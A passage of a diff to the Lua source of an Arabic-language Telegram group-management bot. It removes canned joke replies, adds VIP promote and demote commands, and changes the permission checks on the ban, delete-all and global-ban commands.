-moody = "• تّٰسٌٍـہمٍٰطَُِ سٌٍمٍٰـﮧطَُِ غِِٰيَٰـﮧرِٰ يَٰرِٰحٌٰمٍٰنٍٰـﮧهَٰہۧ اَٰلْٰاَٰعٍِّبٌِٰـاَٰدِٰيَٰ وٍّيَٰنٍٰـہطَُِيَٰ عٍِّطَُِلْٰـﮧهَٰہۧ 😾💔ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'هههه' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• نٍٰشَُـﮧاَٰلْٰلْٰهَٰہۧ دِٰاَٰيَٰمٍٰـﮧهَٰہۧ💆🏻‍♂💘ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'ههههه' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• نٍٰشَُـﮧاَٰلْٰلْٰهَٰہۧ دِٰاَٰيَٰمٍٰـﮧهَٰہۧ💆🏻‍♂💘ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == '😹' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• نٍٰشَُـﮧاَٰلْٰلْٰهَٰہۧ دِٰاَٰيَٰمٍٰـﮧهَٰہۧ💆🏻‍♂💘ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'وين' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• بٌِٰـﮧﮧأرِٰض اَٰلْٰلْٰهَٰہۧ اَٰلْٰـہوٍّاَٰسٌٍعٍِّـﮧهَٰہۧ😽💜ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'كافي لغوة' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• كٍٰـيَٰفِٰنٍٰـﮧهَٰہۧ نٍٰتّٰـﮧهَٰہۧ شَُعٍِّـہلْٰيَٰكٍٰ😼👊ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'نايمين' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• اَٰنٍٰـﮧيَٰ سٌٍهَٰہۧـہرِٰاَٰنٍٰ اَٰحٌٰرِٰسٌٍـﮧكٍٰمٍٰ مٍٰـﮧטּ تّٰـرِٰاَٰمٍٰـﮧبٌِٰ😿😹🙌ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'اكو احد' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• يَٰ عٍِّيَٰـنٍٰـﮧيَٰ اَٰنٍٰـہيَٰ مٍٰـوٍّ૭جًِّـﮧوٍّدِٰ🌝✨ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'فديت' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "•فِٰـﮧﮧدِٰاَٰكٍٰ/جًِّ ثِْْـﮧوٍّ୪لْٰاَٰنٍٰ اَٰلْٰكٍٰـرِٰوٍّ୭بٌِٰ😟😂💚ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'شكو' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• كٍٰلْٰـشَُـﮧﮧيَٰ مٍٰـہاَٰكٍٰـﮧوٍّ اَٰرِٰجًِّـعٍِّ نٍٰـاَٰمٍٰ🐼🌩ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'اوف' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• هَٰہۧـﮧﮧاَٰيَٰ اَٰوٍّفِٰ مٍٰنٍٰ يَٰـاَٰ نٍٰـوٍّ୭عٍِّ صُِـاَٰرِٰتّٰ اَٰلْٰـسٌٍاَٰلْٰفِٰهَٰہۧ مٍٰتّٰـنٍٰعٍِّرِٰفِٰ🌚🌙ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'احبج' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "•جًِّـﮧذَْاَٰبٌِٰ يَٰـرِٰيَٰدِٰ يَٰطَُِـہكٍٰجًِّ😹🌞⚡️ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
-if text == 'انتة منو' then 
-if not database:get('bot:rep:mute'..msg.chat_id_) then
-moody = "• اَٰنٍٰـﮧﮧيَٰ بٌِٰـوٍّ໑تّٰ💨🌝ֆ"
-else 
-moody = ''
-end
-send(msg.chat_id_, msg.id_, 1, moody, 1, 'md')
-end
 
     ------------------------------------ With Pattern -------------------------------------------
 	if text:match("^[Ll][Ee][Aa][Vv][Ee]$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
@@ -2352,14 +1909,14 @@ end
               if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is Already moderator._', 1, 'md')
               else
-         send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم رفعه ادمن` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم رفعه ادمن` ☑️', 1, 'md')
               end
             else
          database:sadd(hash, result.sender_user_id_)
               if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _promoted as moderator._', 1, 'md')
               else
-         send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم رفعه ادمن` ☑️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم رفعه ادمن` ☑️', 1, 'md')
               end
 	end 
     end
@@ -2374,7 +1931,7 @@ end
               if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<code>User '..result.id_..' promoted as moderator.!</code>'
           else
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم رفعه ادمن</code> ☑️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم رفعه ادمن</code> ☑️'
             end
           else 
               if database:get('lang:gp:'..msg.chat_id_) then
@@ -2394,7 +1951,7 @@ end
           if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apmd[2]..'* _promoted as moderator._', 1, 'md')
           else
-   send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apmd[2]..'* `تم رفعه ادمن` ☑️', 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apmd[2]..'* `تم رفعه ادمن` ☑️', 1, 'md')
           end
     end
 	-----------------------------------------------------------------------------------------------
@@ -2406,7 +1963,7 @@ end
               if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is not Promoted._', 1, 'md')
               else
-send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم تنزيله من الادمنيه` ⚠️', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم تنزيله من الادمنيه` ⚠️', 1, 'md')
               end
 	else
          database:srem(hash, result.sender_user_id_)
@@ -2414,7 +1971,7 @@ send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'
 
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _Demoted._', 1, 'md')
 else
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم تنزيله من الادمنيه` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم تنزيله من الادمنيه` ⚠️', 1, 'md')
 	end
   end
   end
@@ -2430,7 +1987,7 @@ else
               if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Demoted</b>'
           else 
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم تنزيله من الادمنيه</code> ⚠️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم تنزيله من الادمنيه</code> ⚠️'
     end
           else 
               if database:get('lang:gp:'..msg.chat_id_) then
@@ -2451,26 +2008,139 @@ else
               if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apmd[2]..'* _Demoted._', 1, 'md')
 else 
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apmd[2]..'* `تم تنزيله من الادمنيه` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apmd[2]..'* `تم تنزيله من الادمنيه` ⚠️', 1, 'md')
   end
+  end
+  -----------------------------------------------------------------------------------------------
+
+        local text = msg.content_.text_:gsub('رفع عضو مميز','setvip')
+	if text:match("^[Ss][Ee][Tt][Vv][Ii][Pp]$")  and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
+	function promote_by_reply(extra, result, success)
+	local hash = 'bot:vipgp:'..msg.chat_id_
+	if database:sismember(hash, result.sender_user_id_) then
+              if database:get('lang:gp:'..msg.chat_id_) then
+         send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is Already vip._', 1, 'md')
+              else
+         send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم رفعه عضو مميز` ☑️', 1, 'md')
+              end
+            else
+         database:sadd(hash, result.sender_user_id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+         send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _promoted as vip._', 1, 'md')
+              else
+         send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم رفعه عضو مميز` ☑️', 1, 'md')
+              end
+	end 
     end
+	      getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
+    end
+	-----------------------------------------------------------------------------------------------
+	if text:match("^[Ss][Ee][Tt][Vv][Ii][Pp] @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
+	local apmd = {string.match(text, "^([Ss][Ee][Tt][Vv][Ii][Pp]) @(.*)$")} 
+	function promote_by_username(extra, result, success)
+	if result.id_ then
+	        database:sadd('bot:vipgp:'..msg.chat_id_, result.id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+            texts = '<code>User '..result.id_..' promoted as vip.!</code>'
+          else
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم رفعه عضو مميز</code> ☑️'
+            end
+          else 
+              if database:get('lang:gp:'..msg.chat_id_) then
+            texts = '<code>User not found!</code>'
+          else
+                        texts = '<code>خطا </code>⚠️'
+end
+    end
+	         send(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
+    end
+	      resolve_username(apmd[2],promote_by_username)
+    end
+	-----------------------------------------------------------------------------------------------
+	if text:match("^[Ss][Ee][Tt][Vv][Ii][Pp] (%d+)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
+	local apmd = {string.match(text, "^([Ss][Ee][Tt][Vv][Ii][Pp]) (%d+)$")} 	
+	        database:sadd('bot:vipgp:'..msg.chat_id_, apmd[2])
+          if database:get('lang:gp:'..msg.chat_id_) then
+	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apmd[2]..'* _promoted as vip._', 1, 'md')
+          else
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apmd[2]..'* `تم رفعه عضو مميز` ☑️', 1, 'md')
+          end
+    end
+	-----------------------------------------------------------------------------------------------
+        local text = msg.content_.text_:gsub('تنزيل عضو مميز','remvip')
+	if text:match("^[Rr][Ee][Mm][Vv][Ii][Pp]$") and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
+	function demote_by_reply(extra, result, success)
+	local hash = 'bot:vipgp:'..msg.chat_id_
+	if not database:sismember(hash, result.sender_user_id_) then
+              if database:get('lang:gp:'..msg.chat_id_) then
+         send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is not Promoted vip._', 1, 'md')
+              else
+send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم تنزيله من الاعضاء المميزين` ⚠️', 1, 'md')
+              end
+	else
+         database:srem(hash, result.sender_user_id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+
+         send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _Demoted vip._', 1, 'md')
+else
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم تنزيله من الاعضاء المميزين` ⚠️', 1, 'md')
+	end
+  end
+  end
+	      getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
+    end
+	-----------------------------------------------------------------------------------------------
+	if text:match("^[Rr][Ee][Mm][Vv][Ii][Pp] @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
+	local hash = 'bot:vipgp:'..msg.chat_id_
+	local apmd = {string.match(text, "^([Rr][Ee][Mm][Vv][Ii][Pp]) @(.*)$")} 
+	function demote_by_username(extra, result, success)
+	if result.id_ then
+         database:srem(hash, result.id_)
+              if database:get('lang:gp:'..msg.chat_id_) then
+            texts = '<b>User </b><code>'..result.id_..'</code> <b>Demoted vip</b>'
+          else 
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم تنزيله من الاعضاء المميزين</code> ⚠️'
+    end
+          else 
+              if database:get('lang:gp:'..msg.chat_id_) then
+            texts = '<code>User not found!</code>'
+          else
+                        texts = '<code>خطا </code>⚠️'
+        end
+    end
+	         send(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
+    end
+	      resolve_username(apmd[2],demote_by_username)
+    end
+	-----------------------------------------------------------------------------------------------
+	if text:match("^[Rr][Ee][Mm][Vv][Ii][Pp] (%d+)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
+	local hash = 'bot:vipgp:'..msg.chat_id_
+	local apmd = {string.match(text, "^([Rr][Ee][Mm][Vv][Ii][Pp]) (%d+)$")} 	
+         database:srem(hash, apmd[2])
+              if database:get('lang:gp:'..msg.chat_id_) then
+	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apmd[2]..'* _Demoted vip._', 1, 'md')
+else 
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apmd[2]..'* `تم تنزيله من الاعضاء المميزين` ⚠️', 1, 'md')
+  end
+  end
+  
 	-----------------------------------------------------------------------------------------------
           local text = msg.content_.text_:gsub('حظر','Ban')
 	if text:match("^[Bb][Aa][Nn]$") and is_mod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
 	function ban_by_reply(extra, result, success)
 	local hash = 'bot:banned:'..msg.chat_id_
-	if is_mod(result.sender_user_id_, result.chat_id_) then
+	if is_vip(result.sender_user_id_, result.chat_id_) then
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick/Ban] Moderators!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حظر الادمنيه والمدراء ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حظر الادمنيه والمدراء ⚠️❌', 1, 'md')
 end
     else
     if database:sismember(hash, result.sender_user_id_) then
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is Already Banned._', 1, 'md')
 else
-send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم حظره` ⚠️', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم حظره` ⚠️', 1, 'md')
 end
 		 chat_kick(result.chat_id_, result.sender_user_id_)
 	else
@@ -2478,7 +2148,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _Banned._', 1, 'md')
        else
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم حظره` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم حظره` ⚠️', 1, 'md')
 end
 		 chat_kick(result.chat_id_, result.sender_user_id_)
 	end
@@ -2495,14 +2165,14 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick/Ban] Moderators!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حظر الادمنيه والمدراء ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حظر الادمنيه والمدراء ⚠️❌', 1, 'md')
 end
     else
 	        database:sadd('bot:banned:'..msg.chat_id_, result.id_)
                   if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Banned.!</b>'
 else
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم حظره</code> ⚠️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم حظره</code> ⚠️'
 end
 		 chat_kick(msg.chat_id_, result.id_)
 	end
@@ -2524,7 +2194,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick/Ban] Moderators!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حظر الادمنيه والمدراء ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حظر الادمنيه والمدراء ⚠️❌', 1, 'md')
 end
     else
 	        database:sadd('bot:banned:'..msg.chat_id_, apba[2])
@@ -2532,7 +2202,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apba[2]..'* _Banned._', 1, 'md')
 else
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apba[2]..'* `تم حظره` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apba[2]..'* `تم حظره` ⚠️', 1, 'md')
   	end
 	end
 end
@@ -2545,14 +2215,14 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is not Banned._', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم الغاء حظره` ☑️', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم الغاء حظره` ☑️', 1, 'md')
 end
 	else
          database:srem(hash, result.sender_user_id_)
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _Unbanned._', 1, 'md')
        else
-   send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم الغاء حظره` ☑️', 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم الغاء حظره` ☑️', 1, 'md')
 end
 	end
     end
@@ -2567,7 +2237,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Unbanned.!</b>'
       else
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم الغاء حظره</code> ☑️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم الغاء حظره</code> ☑️'
 end
           else 
                   if database:get('lang:gp:'..msg.chat_id_) then
@@ -2587,24 +2257,24 @@ end
         if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apba[2]..'* _Unbanned._', 1, 'md')
 else
-   send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apba[2]..'* `تم الغاء حظره` ☑️', 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apba[2]..'* `تم الغاء حظره` ☑️', 1, 'md')
 end
   end
 	-----------------------------------------------------------------------------------------------
           local text = msg.content_.text_:gsub('حذف الكل','delall')
 	if text:match("^[Dd][Ee][Ll][Aa][Ll][Ll]$") and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
 	function delall_by_reply(extra, result, success)
-	if is_mod(result.sender_user_id_, result.chat_id_) then
+	if is_vip(result.sender_user_id_, result.chat_id_) then
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t Delete Msgs from Moderators!!*', 1, 'md')
 else
-         send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حذف رسائل الادمنيه والمدراء ⚠️❌', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حذف رسائل الادمنيه والمدراء ⚠️❌', 1, 'md')
 end
 else
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_All Msgs from _ *'..result.sender_user_id_..'* _Has been deleted!!_', 1, 'md')
        else
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم حذف كل رسائله` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم حذف كل رسائله` ⚠️', 1, 'md')
 end
 		     del_all_msgs(result.chat_id_, result.sender_user_id_)
     end
@@ -2618,14 +2288,14 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t Delete Msgs from Moderators!!*', 1, 'md')
 else
-         send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حذف رسائل الادمنيه والمدراء ⚠️❌', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حذف رسائل الادمنيه والمدراء ⚠️❌', 1, 'md')
 end
 else
 	 		     del_all_msgs(msg.chat_id_, ass[2])
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_All Msgs from _ *'..ass[2]..'* _Has been deleted!!_', 1, 'md')
        else
-         send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..ass[2]..'* `تم حذف كل رسائله` ⚠️', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..ass[2]..'* `تم حذف كل رسائله` ⚠️', 1, 'md')
 end    end
 	end
  -----------------------------------------------------------------------------------------------
@@ -2637,7 +2307,7 @@ end    end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t Delete Msgs from Moderators!!*', 1, 'md')
 else
-         send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حذف رسائل الادمنيه والمدراء ⚠️❌', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حذف رسائل الادمنيه والمدراء ⚠️❌', 1, 'md')
 end
 return false
     end
@@ -2645,7 +2315,7 @@ return false
                   if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>All Msg From user</b> <code>'..result.id_..'</code> <b>Deleted!</b>'
           else 
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم حذف كل رسائله</code> ⚠️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم حذف كل رسائله</code> ⚠️'
 end
           else 
                   if database:get('lang:gp:'..msg.chat_id_) then
@@ -2660,14 +2330,14 @@ end
     end
   -----------------------------------------banall--------------------------------------------------
           local text = msg.content_.text_:gsub('حظر عام','banall')
-          if text:match("^[Bb][Aa][Nn][Aa][Ll][Ll]$") and is_sudo(msg) and msg.reply_to_message_id_ then
+          if text:match("^[Bb][Aa][Nn][Aa][Ll][Ll]$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
             function gban_by_reply(extra, result, success)
               local hash = 'bot:gbanned:'
 	if is_admin(result.sender_user_id_, result.chat_id_) then
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Banall] admins/sudo!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حظر ادمنيه البوت والمطورين عام ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حظر ادمنيه البوت والمطورين عام ⚠️❌', 1, 'md')
 end
     else
               database:sadd(hash, result.sender_user_id_)
@@ -2675,15 +2345,15 @@ end
               if database:get('lang:gp:'..msg.chat_id_) then
                   texts = '<b>User :</b> '..result.sender_user_id_..' <b>Has been Globally Banned !</b>'
                 else
-                  texts = '● - <code>العضو </code>'..result.sender_user_id_..'<code> تم حظره عام</code> ⚠️'
+                  texts = '• <code>العضو </code>'..result.sender_user_id_..'<code> تم حظره عام</code> ⚠️'
 end
 end
 	         send(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
-            end
+          end
             getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
           end
           -----------------------------------------------------------------------------------------------
-          if text:match("^[Bb][Aa][Nn][Aa][Ll][Ll] @(.*)$") and is_sudo(msg) then
+          if text:match("^[Bb][Aa][Nn][Aa][Ll][Ll] @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
             local apbll = {string.match(text, "^([Bb][Aa][Nn][Aa][Ll][Ll]) @(.*)$")}
             function gban_by_username(extra, result, success)
               if result.id_ then
@@ -2691,14 +2361,14 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Banall] admins/sudo!!*', 1, 'md')
        else
-            send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حظر ادمنيه البوت والمطورين عام ⚠️❌', 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حظر ادمنيه البوت والمطورين عام ⚠️❌', 1, 'md')
 end
   else
               local hash = 'bot:gbanned:'
                 if database:get('lang:gp:'..msg.chat_id_) then
                 texts = '<b>User :</b> <code>'..result.id_..'</code> <b> Has been Globally Banned !</b>'
               else 
-                texts = '● - <code>العضو </code>'..result.id_..'<code> تم حظره عام</code> ⚠️'
+                texts = '• <code>العضو </code>'..result.id_..'<code> تم حظره عام</code> ⚠️'
 end
                 database:sadd(hash, result.id_)
                 end
@@ -2714,33 +2384,33 @@ end
             resolve_username(apbll[2],gban_by_username)
           end
           
-          if text:match("^[Bb][Aa][Nn][Aa][Ll][Ll] (%d+)$") and is_sudo(msg) then
+          if text:match("^[Bb][Aa][Nn][Aa][Ll][Ll] (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
             local apbll = {string.match(text, "^([Bb][Aa][Nn][Aa][Ll][Ll]) (%d+)$")}
   local hash = 'bot:gbanned:'
 	if is_admin(apbll[2], msg.chat_id_) then
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Banall] admins/sudo!!*', 1, 'md')
        else
-            send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع حظر ادمنيه البوت والمطورين عام ⚠️❌', 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, '• لا تستطيع حظر ادمنيه البوت والمطورين عام ⚠️❌', 1, 'md')
 end
     else
 	        database:sadd(hash, apbll[2])
                   if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apbll[2]..'* _Has been Globally Banned _', 1, 'md')
 else
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apbll[2]..'* `تم حظره عام` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apbll[2]..'* `تم حظره عام` ⚠️', 1, 'md')
   	end
 	end
 end
           -----------------------------------------------------------------------------------------------
           local text = msg.content_.text_:gsub('الغاء العام','unbanall')
-          if text:match("^[Uu][Nn][Bb][Aa][Nn][Aa][Ll][Ll]$") and is_sudo(msg) and msg.reply_to_message_id_ then
+          if text:match("^[Uu][Nn][Bb][Aa][Nn][Aa][Ll][Ll]$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) and msg.reply_to_message_id_ then
             function ungban_by_reply(extra, result, success)
               local hash = 'bot:gbanned:'
               if database:get('lang:gp:'..msg.chat_id_) then
                   texts = '<b>User :</b> '..result.sender_user_id_..' <b>Has been Globally Unbanned !</b>'
              else
-                  texts =  '● - <code>العضو '..result.sender_user_id_..' تم الغاء حظره من العام </code> ☑️'
+                  texts =  '• <code>العضو '..result.sender_user_id_..' تم الغاء حظره من العام </code> ☑️'
 	         send(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
             end
               database:srem(hash, result.sender_user_id_)
@@ -2748,7 +2418,7 @@ end
             getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
           end
           -----------------------------------------------------------------------------------------------
-          if text:match("^[Uu][Nn][Bb][Aa][Nn][Aa][Ll][Ll] @(.*)$") and is_sudo(msg) then
+          if text:match("^[Uu][Nn][Bb][Aa][Nn][Aa][Ll][Ll] @(.*)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
